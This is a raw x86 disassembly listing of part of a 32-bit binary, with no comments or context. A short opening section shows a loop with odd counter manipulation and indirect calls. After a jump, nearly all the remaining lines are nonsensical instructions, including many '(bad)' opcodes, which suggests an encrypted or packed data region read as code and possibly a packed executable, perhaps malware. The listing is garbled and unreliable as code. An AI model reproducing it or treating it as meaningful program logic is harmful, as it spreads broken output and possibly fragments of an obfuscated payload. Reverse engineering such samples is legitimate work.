  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	icebp  
  4115ac:	out    0x88,eax
  4115ae:	ins    DWORD PTR es:[edi],dx
  4115af:	inc    eax
  4115b0:	scas   eax,DWORD PTR es:[edi]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	ins    BYTE PTR es:[edi],dx
  4115b8:	scas   eax,DWORD PTR es:[edi]
  4115b9:	dec    ebp
  4115ba:	push   ds
  4115bb:	mov    fs,WORD PTR [ebx-0x73043e94]
  4115c1:	sbb    BYTE PTR [ebx],0xab
  4115c4:	pop    eax
  4115c5:	pop    es
  4115c6:	fistp  QWORD PTR ds:0xd3a3ddad
  4115cc:	mov    ecx,0xab2ca61c
  4115d1:	push   es
  4115d2:	xchg   ebp,eax
  4115d3:	mov    ecx,0x49d67bab
  4115d8:	inc    ebx
  4115d9:	stos   DWORD PTR es:[edi],eax
  4115da:	dec    ebp
  4115db:	ins    DWORD PTR es:[edi],dx
  4115dc:	outs   dx,BYTE PTR ds:[esi]
  4115dd:	sub    BYTE PTR [edx+0x68],dl
  4115e0:	xlat   BYTE PTR ds:[ebx]
  4115e1:	dec    edx
  4115e2:	dec    esi
  4115e4:	sub    edi,ecx
  4115e6:	jg     0x411572
  4115e8:	mov    ah,BYTE PTR [esi-0x34ea2d4b]
  4115ee:	fidivr WORD PTR [edi]
  4115f0:	fsub   DWORD PTR [esi+ecx*2+0x31]
  4115f4:	pop    ds
  4115f5:	lock mov ah,0x23
  4115f8:	(bad)  
  4115f9:	(bad)  
  4115fa:	pop    ebp
  4115fb:	add    al,0x1e
  4115fd:	aaa    
  4115fe:	aam    0x69
  411600:	sub    ah,BYTE PTR [ebx]
  411602:	(bad)  
  411603:	icebp  
  411604:	sahf   
  411605:	cmp    eax,0x779e85c2
  41160a:	dec    esi
  41160b:	cwde   
  41160c:	pop    ecx
  41160d:	jbe    0x4115b0
  41160f:	clc    
  411610:	mov    ecx,esp
  411612:	aad    0xe0
  411614:	mov    BYTE PTR [edi],0xe2
  411617:	call   0x174962
  41161c:	cmp    BYTE PTR [esi-0x35],0x31
  411620:	test   DWORD PTR [esi-0x4c],esp
  411623:	pop    ds
  411624:	into   
  411625:	int3   
  411626:	pop    ds
  411627:	std    
  411628:	in     al,dx
  411629:	loope  0x41164e
  41162b:	ret    0x42bd
  41162e:	aam    0x92
  411630:	pop    ss
  411631:	cmp    DWORD PTR [edx],esi
  411633:	outs   dx,DWORD PTR ds:[esi]
  411634:	daa    
  411635:	inc    ecx
  411636:	jl     0x411671
  411638:	rcr    DWORD PTR [ebp+0x2d45576f],0x7e
  41163f:	sbb    cl,dh
  411641:	pop    esp
  411642:	cmp    edi,eax
  411644:	rol    DWORD PTR [edx-0x67],cl
  411647:	repz or eax,0x26e23613
  41164d:	push   eax
  41164e:	sbb    dl,bh
  411650:	xlat   BYTE PTR ds:[ebx]
  411651:	gs jecxz 0x4115db
  411654:	sbb    esi,DWORD PTR [esi]
  411656:	dec    ebp
  411657:	inc    ebx
  411658:	xor    eax,0x5faa6110
  41165d:	inc    ebx
  41165e:	fld    TBYTE PTR [edi-0x5cc47b24]
  411664:	in     al,dx
  411665:	push   ds
  411666:	(bad)  
  411667:	scas   eax,DWORD PTR es:[edi]
  411668:	sub    al,bh
  41166a:	mov    ebx,0x14bd1973
  41166f:	loop   0x41167c
  411671:	fwait
  411672:	pusha  
  411673:	popa   
  411674:	xor    DWORD PTR [eax+0x75],ecx
  411677:	adc    dh,BYTE PTR [ebx+edi*1+0x1ee6cfbc]
  41167e:	sbb    BYTE PTR [esi+0x29],ch
  411681:	int    0xc1
  411683:	adc    eax,0xdb87efab
  411688:	xchg   ah,dl
  41168a:	ja     0x411670
  41168c:	jle    0x41169c
  41168e:	(bad)  
  411690:	or     al,BYTE PTR [edi-0x30016b57]
  411696:	outs   dx,DWORD PTR ds:[esi]
  411697:	pop    esp
  411698:	sti    
  411699:	daa    
  41169a:	xor    esi,ebp
  41169c:	dec    esp
  41169d:	je     0x4116fc
  41169f:	mov    edx,0x7947d1ac
  4116a4:	dec    ebp
  4116a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a6:	push   eax
  4116a7:	sub    al,0xbf
  4116a9:	or     bl,BYTE PTR [eax+0x44]
  4116ac:	adc    al,0x88
  4116ae:	dec    edi
  4116af:	pop    esp
  4116b0:	std    
  4116b1:	inc    eax
  4116b2:	push   DWORD PTR [ebx+0x49]
  4116b5:	shl    cl,cl
  4116b7:	aaa    
  4116b8:	push   es
  4116b9:	adc    ch,BYTE PTR [edx+0x68b442ac]
  4116bf:	clc    
  4116c0:	mov    dl,0xac
  4116c2:	add    DWORD PTR [ebx],0xbe99567a
  4116c8:	xor    eax,0x9179c624
  4116cd:	or     esi,DWORD PTR [edi+0xf1764b9]
  4116d3:	jo     0x41167c
  4116d5:	lods   eax,DWORD PTR ds:[esi]
  4116d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d7:	or     BYTE PTR [edi+0x62347d05],0x9c
  4116de:	jmp    0x7369ed35
  4116e3:	stos   BYTE PTR es:[edi],al
  4116e4:	outs   dx,DWORD PTR ds:[esi]
  4116e5:	das    
  4116e6:	jb     0x411757
  4116e8:	sbb    eax,DWORD PTR [edx+0x41]
  4116eb:	fisubr DWORD PTR [ebp-0x1b]
  4116ee:	int3   
  4116ef:	or     BYTE PTR [edi-0x502f01ad],dl
  4116f5:	arpl   WORD PTR [eax+0x4ac59412],cx
  4116fb:	xchg   esp,eax
  4116fc:	sti    
  4116fd:	mov    ebx,0x28110087
  411702:	mov    bh,0x13
  411704:	inc    cx
  411706:	hlt    
  411707:	sbb    ebx,eax
  411709:	stos   BYTE PTR es:[edi],al
  41170a:	sar    BYTE PTR [ecx],cl
  41170c:	sbb    al,0xd
  41170e:	cmp    eax,0x1f3048e6
  411713:	out    0x49,eax
  411715:	add    al,0x65
  411717:	jge    0x41176e
  411719:	mov    al,ds:0x1b67437
  41171e:	iret   
  41171f:	pop    eax
  411720:	sahf   
  411721:	jne    0x4116b8
  411723:	(bad)  
  411724:	adc    eax,DWORD PTR [eax]
  411726:	stc    
  411727:	and    edi,edx
  411729:	sbb    al,0xd
  41172b:	clc    
  41172c:	adc    DWORD PTR [edx+0x47],esi
  41172f:	adc    esi,DWORD PTR [edx+0x154fd33e]
  411735:	sbb    DWORD PTR [ebp+0x22d8d01],0xffffffa7
  41173c:	xchg   ecx,eax
  41173d:	or     BYTE PTR [edx-0x5bc3d2d3],bl
  411743:	sbb    ch,dl
  411745:	(bad)  
  411746:	pop    ebp
  411747:	inc    edx
  411748:	neg    bh
  41174a:	(bad)  
  41174b:	jg     0x411733
  41174d:	mov    edx,DWORD PTR [edx+0x6a]
  411750:	dec    ecx
  411751:	pop    ecx
  411752:	mov    BYTE PTR [esi-0x1382de0e],al
  411758:	add    BYTE PTR [esi],cl
  41175a:	sub    ebp,DWORD PTR [edi]
  41175c:	arpl   di,bp
  41175e:	out    dx,eax
  41175f:	imul   ebp,DWORD PTR [ebx],0xffffffc1
  411762:	pop    es
  411763:	inc    eax
  411764:	jg     0x4117c1
  411766:	xor    BYTE PTR [esi],ch
  411768:	outs   dx,BYTE PTR ds:[esi]
  411769:	or     cl,BYTE PTR [edi-0x6992c26c]
  41176f:	mov    ebp,0xd23b772
  411774:	in     al,dx
  411775:	or     bh,BYTE PTR [ebx+0x2c]
  411778:	jge    0x411751
  41177a:	lods   eax,DWORD PTR ds:[esi]
  41177b:	inc    esi
  41177c:	dec    eax
  41177d:	xchg   edx,eax
  41177e:	in     al,0xb5
  411780:	mov    edx,DWORD PTR [esi]
  411782:	(bad)  
  411783:	sbb    eax,0x9478b26e
  411788:	or     bh,bh
  41178a:	push   0xffffff91
  41178c:	mov    ds:0x6586fc30,eax
  411791:	pop    ss
  411792:	push   ecx
  411793:	es jecxz 0x4117b9
  411796:	or     eax,0xbe4b7b77
  41179b:	mov    cl,0x1f
  41179d:	fmul   QWORD PTR [di+0x4b]
  4117a1:	icebp  
  4117a2:	inc    edi
  4117a3:	icebp  
  4117a4:	fucomp st(6)
  4117a6:	mov    BYTE PTR [edx-0x6d],bh
  4117a9:	cmp    eax,0x7582f0c3
  4117ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117af:	cmc    
  4117b0:	mov    edi,0x2c105f92
  4117b5:	mov    al,ds:0x8633b5f2
  4117ba:	push   0x46
  4117bc:	pop    edi
  4117bd:	and    al,0x6b
  4117bf:	push   cs
  4117c0:	lahf   
  4117c1:	push   0x37
  4117c3:	push   es
  4117c4:	test   DWORD PTR [bp+di+0x6203],edi
  4117c9:	sbb    ebx,DWORD PTR [esp+edi*4]
  4117cc:	jb     0x411770
  4117ce:	aaa    
  4117cf:	(bad)  
  4117d1:	push   es
  4117d2:	add    ebp,DWORD PTR [ebx+0x5915c3a7]
  4117d8:	loope  0x4117a9
  4117da:	inc    edi
  4117db:	push   0x6eb2c5da
  4117e0:	enter  0xce16,0x3e
  4117e4:	popa   
  4117e5:	test   al,0xaa
  4117e7:	(bad)  
  4117e9:	or     edx,DWORD PTR [esi-0x41]
  4117ec:	lahf   
  4117ed:	cmp    eax,0x1054f918
  4117f2:	mov    ch,0x6a
  4117f4:	push   esp
  4117f5:	hlt    
  4117f6:	(bad)  
  4117f7:	jae    0x4117be
  4117f9:	cdq    
  4117fa:	sbb    BYTE PTR [ebx+0x12bff8e],cl
  411800:	add    BYTE PTR [edi+0x72],ch
  411803:	test   ebx,ebp
  411805:	mov    fs,WORD PTR [edi]
  411807:	jns    0x41186e
  411809:	jmp    0x4f03efb1
  41180e:	into   
  41180f:	add    DWORD PTR [ecx+ebx*8-0x1274147a],ecx
  411816:	xor    al,0xdd
  411818:	push   esi
  411819:	cmc    
  41181a:	pop    eax
  41181b:	mov    ecx,0xc4838821
  411820:	jmp    0x76c3:0xb98c0275
  411827:	cmp    cl,BYTE PTR [eax-0x393231fe]
  41182d:	stos   BYTE PTR es:[edi],al
  41182e:	pop    edx
  41182f:	xchg   edi,eax
  411830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411831:	je     0x41181e
  411833:	repnz xchg ecx,eax
  411835:	xchg   edx,eax
  411836:	or     dl,BYTE PTR [eax+edx*2+0xbf7702e]
  41183d:	jno    0x4118b4
  41183f:	stos   DWORD PTR es:[edi],eax
  411840:	les    ecx,FWORD PTR [ebx]
  411842:	pusha  
  411843:	xchg   ebx,eax
  411844:	ror    BYTE PTR [esi],cl
  411846:	mov    dh,0xbb
  411848:	xchg   esp,eax
  411849:	sbb    eax,0xaaa4633c
  41184e:	jb     0x4118c2
  411850:	xor    BYTE PTR [ebp+edi*4-0x53],al
  411854:	add    DWORD PTR [edx-0x37359ec],ebx
  41185a:	fistp  WORD PTR [edx+ebp*4+0x5402ccc3]
  411861:	call   0xdc4d7527
  411866:	lock test BYTE PTR [ecx],dl
  411869:	(bad)  
  41186a:	int3   
  41186b:	(bad)  
  41186c:	jne    0x41185b
  41186e:	inc    ecx
  41186f:	cdq    
  411870:	mov    edx,0x257ae13a
  411875:	cmp    al,0xf3
  411877:	jmp    0x66ec004e
  41187c:	sub    DWORD PTR [edi+0x2fa696ee],eax
  411882:	jb     0x411891
  411884:	push   ecx
  411885:	ins    DWORD PTR es:[edi],dx
  411886:	adc    BYTE PTR [ebx+0x40ed002e],ah
  41188c:	push   eax
  41188d:	mov    ebp,DWORD PTR [ebx+ebx*8+0x18]
  411891:	cld    
  411892:	in     eax,dx
  411893:	pop    eax
  411894:	sahf   
  411895:	out    0x6c,al
  411897:	push   ebx
  411898:	jmp    0x411839
  41189a:	sub    eax,0xe67cf224
  41189f:	pop    ds
  4118a0:	mov    DWORD PTR [edi],ebp
  4118a2:	test   DWORD PTR [eax+0x2e],ecx
  4118a5:	loop   0x41183d
  4118a7:	dec    BYTE PTR [edi]
  4118a9:	in     eax,dx
  4118aa:	dec    edi
  4118ab:	mov    cl,0xd
  4118ad:	mov    al,0x4b
  4118af:	ret    
  4118b0:	add    eax,0x9593d5cd
  4118b5:	inc    esi
  4118b6:	adc    bl,BYTE PTR [ecx+0x392dfaad]
  4118bc:	sahf   
  4118bd:	and    eax,0x1411e1fc
  4118c2:	cwde   
  4118c3:	das    
  4118c4:	loop   0x411863
  4118c6:	(bad)  
  4118c7:	loop   0x4118df
  4118c9:	cmp    DWORD PTR [edx+0x45],ebp
  4118cc:	mov    esp,0x5b81c296
  4118d1:	mov    ebx,0xe91afcd3
  4118d6:	cwde   
  4118d7:	push   0x82dbc2f6
  4118dc:	mov    cl,0xc4
  4118de:	jl     0x4118e7
  4118e0:	jns    0x41187d
  4118e2:	popf   
  4118e3:	int3   
  4118e4:	aaa    
  4118e5:	and    BYTE PTR [ecx+0x1b],ch
  4118e8:	sub    DWORD PTR [ebp-0xe],ebp
  4118eb:	jge    0x41188b
  4118ed:	dec    eax
  4118ee:	fldlg2 
  4118f0:	jecxz  0x411882
  4118f2:	test   BYTE PTR [ebx+0x6c590874],dl
  4118f8:	ja     0x4118e6
  4118fa:	lea    edi,[ecx+0x62a2e5c2]
  411900:	push   ss
  411901:	pop    eax
  411902:	mov    esp,0xc184982a
  411907:	and    eax,0x88940f20
  41190c:	and    eax,0x987a1831
  411911:	pextrw esi,(bad),0xc5
  411913:	xor    ebx,DWORD PTR [eax-0x237a40f0]
  411919:	call   0x9a6e:0x9b2b4d53
  411920:	arpl   WORD PTR [ecx],cx
  411922:	xchg   edi,eax
  411923:	repnz or dh,BYTE PTR [edx]
  411926:	nop
  411927:	cmp    DWORD PTR [edx],ecx
  411929:	ja     0x411987
  41192b:	push   es
  41192c:	fidiv  DWORD PTR [ecx+0x8a2d96f]
  411932:	dec    edx
  411933:	lock sub bh,BYTE PTR [ecx+ecx*1]
  411937:	out    dx,eax
  411938:	aad    0x31
  41193a:	pop    ecx
  41193b:	fiadd  DWORD PTR [edx+0x4c17c71d]
  411941:	sbb    cl,BYTE PTR [edx]
  411943:	lds    esp,FWORD PTR [eax-0x52148cc9]
  411949:	into   
  41194a:	lods   al,BYTE PTR ds:[esi]
  41194b:	sub    DWORD PTR [ebp-0x8],edi
  41194e:	mov    ecx,0x33485893
  411953:	sbb    ah,BYTE PTR [eax+0x58eb9f8a]
  411959:	mov    bl,0xcf
  41195b:	(bad)  
  41195c:	xchg   ecx,eax
  41195d:	scas   eax,DWORD PTR es:[edi]
  41195e:	mov    esi,0xc721c963
  411963:	push   edi
  411964:	xor    ch,al
  411966:	(bad)  
  411967:	pop    edi
  411968:	into   
  411969:	cmp    eax,DWORD PTR [ebx]
  41196b:	into   
  41196c:	pop    esi
  41196d:	xor    DWORD PTR [esi],ebx
  41196f:	lahf   
  411970:	lods   eax,DWORD PTR ds:[esi]
  411971:	mov    eax,0xb7a6da28
  411976:	cmp    eax,0xd81ed00e
  41197b:	sub    BYTE PTR [eax-0x7254aefb],dl
  411981:	les    eax,FWORD PTR [eax-0x11f9a089]
  411987:	test   DWORD PTR ds:0xf8db42a9,eax
  41198d:	iret   
  41198e:	out    dx,eax
  41198f:	stc    
  411990:	push   edi
  411991:	icebp  
  411992:	mov    ebx,0x6035c23a
  411997:	adc    eax,0x8fe8179
  41199c:	adc    bh,BYTE PTR [ebx]
  41199e:	jo     0x41195c
  4119a0:	dec    esp
  4119a1:	dec    ecx
  4119a2:	mov    cl,0x41
  4119a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a5:	mov    edi,0x99b0abb1
  4119aa:	adc    BYTE PTR [ecx-0x1ddb3d08],ch
  4119b0:	test   DWORD PTR [edi-0x48],0x86545854
  4119b7:	push   ebx
  4119b8:	push   ebx
  4119b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ba:	repz mov edi,0xd77b37f5
  4119c0:	mov    ebp,0x6f6661ba
  4119c5:	adc    ebp,DWORD PTR [esi]
  4119c7:	bound  bp,DWORD PTR [edi+0x628e3781]
  4119ce:	outs   dx,DWORD PTR ds:[esi]
  4119cf:	jae    0x411951
  4119d1:	xchg   edx,eax
  4119d2:	mov    eax,esi
  4119d4:	in     eax,dx
  4119d5:	mov    esp,0xee8fb398
  4119da:	or     eax,0xa0746703
  4119df:	lea    esp,[ecx-0x1]
  4119e2:	stc    
  4119e3:	in     al,0x94
  4119e5:	les    ecx,FWORD PTR [edi-0x2d]
  4119e8:	test   eax,0xda41caa8
  4119ed:	mov    ecx,eax
  4119ef:	mov    dl,0x95
  4119f1:	loopne 0x4119ec
  4119f3:	cdq    
  4119f4:	mov    ebp,0xdb94a902
  4119f9:	popf   
  4119fa:	sar    DWORD PTR [edx],cl
  4119fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fd:	xor    al,0x9
  4119ff:	push   es
  411a00:	pushf  
  411a01:	add    ebx,DWORD PTR [edi+esi*1+0x1e22944]
  411a08:	pusha  
  411a09:	das    
  411a0a:	mov    edi,0x275c9ecd
  411a0f:	mov    eax,0x4038b558
  411a14:	in     al,0x37
  411a16:	vmread DWORD PTR [ebx+eiz*8],esi
  411a1a:	jmp    0xa10f7a75
  411a1f:	mov    dl,0x27
  411a21:	pop    eax
  411a23:	sbb    al,0xf9
  411a25:	push   edx
  411a26:	in     eax,0xae
  411a28:	rcl    DWORD PTR [esi-0x358f4987],cl
  411a2e:	nop
  411a2f:	xchg   ecx,eax
  411a30:	xor    edx,DWORD PTR [ecx+0x6f]
  411a33:	lds    edi,FWORD PTR [ebp-0x5c49b56]
  411a39:	mov    bh,bh
  411a3b:	sbb    DWORD PTR [esi+0x6250a589],ecx
  411a41:	mov    esp,0x4cf8cf44
  411a46:	cld    
  411a47:	pop    eax
  411a48:	adc    al,BYTE PTR [ebx+0x4e]
  411a4b:	es cmp al,0x8
  411a4e:	or     BYTE PTR [edx-0x6986659c],dl
  411a54:	inc    edx
  411a55:	test   eax,0xfd27cc1a
  411a5a:	inc    edi
  411a5b:	loop   0x411a95
  411a5d:	retf   0x3222
  411a60:	in     al,0x47
  411a62:	push   esp
  411a63:	(bad)  
  411a64:	mov    es,WORD PTR [ecx*2+0x6b30cbd5]
  411a6b:	mov    cl,0x3a
  411a6d:	fbstp  TBYTE PTR [esi-0x370b9361]
  411a73:	sub    ch,ch
  411a75:	dec    esp
  411a76:	(bad)  
  411a77:	mov    ecx,0x7b0cfab9
  411a7c:	pop    eax
  411a7d:	mov    bl,0xdc
  411a7f:	push   ss
  411a80:	inc    ebx
  411a81:	jl     0x411a59
  411a83:	fwait
  411a84:	xor    BYTE PTR [ebp+0x50],0x1b
  411a88:	lds    edi,FWORD PTR [ebx+0x7f]
  411a8b:	out    dx,al
  411a8c:	and    BYTE PTR [edi+ebx*8-0x21],0x4a
  411a91:	push   ebx
  411a92:	sub    eax,0x49509386
  411a97:	nop    DWORD PTR [ecx-0x3d54ea9a]
  411a9e:	and    al,0x4c
  411aa0:	mov    dh,0x14
  411aa2:	mov    edx,0x8f6003bb
  411aa7:	xchg   ecx,eax
  411aa8:	rcl    DWORD PTR fs:[eax+0x2b197d49],cl
  411aaf:	loopne 0x411a8b
  411ab1:	sar    ecx,1
  411ab3:	(bad)  
  411ab4:	arpl   WORD PTR [esi-0x3c],bp
  411ab7:	(bad)  [eax-0x7e]
  411aba:	fnstsw WORD PTR [edx]
  411abc:	mov    bl,0x83
  411abe:	pop    ecx
  411abf:	mov    BYTE PTR [ebx],ch
  411ac1:	jo     0x411ae0
  411ac3:	push   eax
  411ac4:	mov    edx,0x57589be3
  411ac9:	and    al,dl
  411acb:	cmp    eax,0xd5a378a8
  411ad0:	pop    ds
  411ad1:	int    0x91
  411ad3:	(bad)  
  411ad4:	add    al,0x83
  411ad6:	mov    al,ds:0x5f07334a
  411adb:	gs mov ah,0xd1
  411ade:	aas    
  411adf:	fsub   QWORD PTR [ecx]
  411ae1:	ins    BYTE PTR es:[edi],dx
  411ae2:	jmp    0x29cc3ff
  411ae7:	sub    bl,BYTE PTR [ebx+0x2d177979]
  411aed:	push   es
  411aee:	sahf   
  411aef:	jae    0x411b3b
  411af1:	dec    edx
  411af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411af3:	test   DWORD PTR [ebp-0xf9c9a8c],ebx
  411af9:	push   ss
  411afa:	pop    ebx
  411afb:	loop   0x411a9a
  411afd:	and    ebx,DWORD PTR [eax+0x748a6797]
  411b03:	xchg   ebx,eax
  411b04:	faddp  st(1),st
  411b06:	jmp    edx
  411b08:	pop    edx
  411b09:	aas    
  411b0a:	hlt    
  411b0b:	xchg   ebx,eax
  411b0c:	cmp    DWORD PTR [edx+0x10],edx
  411b0f:	ins    BYTE PTR es:[edi],dx
  411b10:	xchg   edx,eax
  411b11:	dec    eax
  411b12:	retf   0xea5d
  411b15:	add    eax,0xa72f3dd1
  411b1a:	popa   
  411b1b:	aas    
  411b1c:	sahf   
  411b1d:	adc    ebp,ebx
  411b1f:	mov    dh,0x26
  411b21:	stos   DWORD PTR es:[edi],eax
  411b22:	(bad)  
  411b23:	sub    BYTE PTR [ebp-0x80],bl
  411b26:	jb     0x411b45
  411b28:	out    0x2c,eax
  411b2a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411b2c:	pop    es
  411b2d:	(bad)  
  411b2e:	and    DWORD PTR [edi+eax*4-0x232617ac],esp
  411b35:	icebp  
  411b36:	jno    0x411af5
  411b38:	icebp  
  411b39:	or     ebp,edx
  411b3b:	add    al,0xe7
  411b3d:	fwait
  411b3e:	jb     0x411b73
  411b40:	ins    DWORD PTR es:[edi],dx
  411b41:	push   edi
  411b42:	dec    ebx
  411b43:	in     al,0x2f
  411b45:	add    al,0xa5
  411b47:	push   ds
  411b48:	or     bl,BYTE PTR [edx-0x7599139a]
  411b4e:	mov    ds:0xbb470f34,eax
  411b53:	cdq    
  411b54:	pop    ecx
  411b55:	dec    ebp
  411b56:	sbb    eax,0xee6ad9b7
  411b5b:	cmp    edx,DWORD PTR ds:0x1e320ce4
  411b61:	mov    ebp,0xa54b4f3
  411b66:	sub    BYTE PTR [edi+0x75],dl
  411b69:	sbb    eax,0xb350da78
  411b6e:	test   eax,0xe0546c82
  411b73:	call   0x8151e6f7
  411b78:	mov    esi,0x52343a85
  411b7d:	mov    ecx,DWORD PTR [edx]
  411b7f:	push   ebx
  411b80:	push   ds
  411b81:	daa    
  411b82:	ror    ebx,0x4e
  411b85:	mov    esp,0xd931f6cb
  411b8a:	xchg   edx,eax
  411b8b:	cdq    
  411b8c:	cmovnp ecx,DWORD PTR [ecx]
  411b8f:	inc    ecx
  411b90:	rol    BYTE PTR [ecx-0x24],cl
  411b93:	and    BYTE PTR [eax+0x3],al
  411b96:	xchg   DWORD PTR [ecx],esi
  411b98:	nop
  411b99:	inc    eax
  411b9a:	gs cmp al,0xf
  411b9d:	ret    0x9899
  411ba0:	pop    esi
  411ba1:	cmp    BYTE PTR [edi+0x13],0xf6
  411ba5:	inc    ebp
  411ba6:	loop   0x411b96
  411ba8:	jnp    0x411b7d
  411baa:	jecxz  0x411b7d
  411bac:	add    al,0xf4
  411bae:	inc    ecx
  411baf:	cmp    al,0x51
  411bb1:	fidivr WORD PTR [edx+0x44835e2]
  411bb7:	mov    eax,ds:0x8eb98005
  411bbc:	and    edx,esi
  411bbe:	cmp    ch,cl
  411bc0:	ins    BYTE PTR es:[edi],dx
  411bc1:	rol    DWORD PTR [ebx+0x60369362],1
  411bc7:	pop    ss
  411bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bc9:	push   0xabb2a60b
  411bce:	lods   al,BYTE PTR ds:[esi]
  411bcf:	into   
  411bd0:	xchg   BYTE PTR [eax-0x2afe35d9],bl
  411bd6:	ror    DWORD PTR [ecx+0xf3cc4a6],0x48
  411bdd:	idiv   bl
  411bdf:	nop
  411be0:	loop   0x411c3d
  411be2:	call   0xa6aa:0xc56a43bd
  411be9:	scas   al,BYTE PTR es:[edi]
  411bea:	jmp    0x411bef
  411bec:	enter  0xc165,0xeb
  411bf0:	dec    eax
  411bf1:	mov    esp,0xf9ac0cdb
  411bf6:	or     BYTE PTR [eax-0x58829d5c],ah
  411bfc:	jecxz  0x411c60
  411bfe:	sbb    cl,BYTE PTR [ecx+0x52]
  411c01:	(bad)
  411c04:	(bad)  
  411c05:	adc    WORD PTR [edx],0x64
  411c09:	gs mov dh,0x48
  411c0c:	xchg   esp,eax
  411c0d:	inc    ebx
  411c0e:	mov    al,ds:0x3dc24b0d
  411c13:	cmp    BYTE PTR [eax+0x56],bl
  411c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c17:	and    cl,BYTE PTR [eax+ecx*8+0x9d59251]
  411c1e:	popa   
  411c1f:	mov    dh,0x4e
  411c21:	into   
  411c22:	iret   
  411c23:	outs   dx,DWORD PTR ds:[esi]
  411c24:	jmp    0x411c78
  411c26:	inc    edi
  411c27:	jl     0x411bc6
  411c29:	mov    ds,WORD PTR [ebp+0x68]
  411c2c:	jb     0x411cac
  411c2e:	mov    dl,0x3b
  411c30:	and    eax,0x8607db4f
  411c35:	sub    dl,BYTE PTR [edi+ebp*4+0x74e9bc88]
  411c3c:	repnz mov eax,0x6371490a
  411c42:	mov    eax,0x6f1d8780
  411c47:	scas   al,BYTE PTR es:[edi]
  411c48:	icebp  
  411c49:	xchg   ebp,eax
  411c4a:	das    
  411c4b:	lods   al,BYTE PTR ds:[esi]
  411c4c:	xor    BYTE PTR [edx+0x303fcba0],bh
  411c52:	xchg   DWORD PTR [eax+esi*2-0x39ee49f3],edx
  411c59:	push   0x3cf1c335
  411c5e:	(bad)  
  411c5f:	fild   QWORD PTR [eax-0x34]
  411c62:	xchg   BYTE PTR [ebp+0x5f],bh
  411c65:	pop    ebx
  411c66:	fcom   DWORD PTR ds:0x4d2dd88b
  411c6c:	mov    DWORD PTR [ecx+0x3e],0x4a198cf2
  411c73:	sbb    cl,BYTE PTR [edx-0x3d]
  411c76:	jg     0x411ca5
  411c78:	jg     0x411c79
  411c7a:	push   0x27c23418
  411c7f:	or     DWORD PTR [edi-0x57],0x639a7f11
  411c86:	ss ret 
  411c88:	mov    ecx,0xcc6485ec
  411c8d:	xor    BYTE PTR [esi+ecx*1],0xfc
  411c91:	adc    DWORD PTR [ebp+0x7f9a4f9c],ecx
  411c97:	jnp    0x411c31
  411c99:	pop    es
  411c9a:	pop    ebx
  411c9b:	pushf  
  411c9c:	loopne 0x411c88
  411c9e:	dec    esi
  411c9f:	cld    
  411ca0:	cdq    
  411ca1:	fsub   DWORD PTR [eax]
  411ca3:	das    
  411ca4:	test   DWORD PTR [eax+ebx*8-0x64],esp
  411ca8:	std    
  411ca9:	dec    ebp
  411caa:	fadd   DWORD PTR [edx+0x78]
  411cad:	stc    
  411cae:	pop    ss
  411caf:	retf   
  411cb0:	add    edi,edi
  411cb2:	cmp    BYTE PTR [eax-0x57],0xb9
  411cb6:	pop    ss
  411cb7:	aaa    
  411cb8:	or     BYTE PTR [esi+0x7cef3334],dl
  411cbe:	or     BYTE PTR [ecx],0x81
  411cc1:	cmp    DWORD PTR [edi+0x3],ebp
  411cc4:	mov    WORD PTR [ebp+0x4c6bb94],cs
  411cca:	add    BYTE PTR [edi+0x305e801f],dl
  411cd0:	sbb    al,dl
  411cd2:	xor    al,0xe4
  411cd4:	call   0x6f16:0xbe61622c
  411cdb:	in     al,dx
  411cdc:	ror    BYTE PTR [ebp+0x4a],0x6c
  411ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce1:	rol    BYTE PTR [esi],0xc7
  411ce4:	xchg   ebx,eax
  411ce5:	xchg   esi,eax
  411ce6:	xor    eax,0x97efc3ac
